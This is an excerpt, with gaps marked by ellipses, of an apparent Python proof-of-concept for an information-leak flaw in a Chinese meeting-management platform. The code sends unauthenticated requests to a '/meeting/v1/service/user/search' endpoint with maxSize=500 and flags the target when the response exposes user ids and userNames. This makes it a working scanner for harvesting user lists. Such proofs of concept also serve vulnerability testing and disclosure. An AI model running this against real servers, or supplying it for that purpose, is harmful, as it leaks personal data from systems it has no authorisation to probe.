...
def poc(target):
    payloade="/meeting/v1/service/user/search?maxSize=500&query="
    try:
        res=requests.get(url=target,timeout=5,verify=False)
        if res.status_code==200:
            res1=requests.get(url=target+payloade,timeout=5,verify=False)
            if re.search('(id)',res1.text).group(0)=="id" and re.search('(userName)',res1.text).group(0)=="userName" and res1.status_code==200:
...
def main():
    a()
    parse=argparse.ArgumentParser(description="智能会议管理平台-search-info-leak-信息泄露")
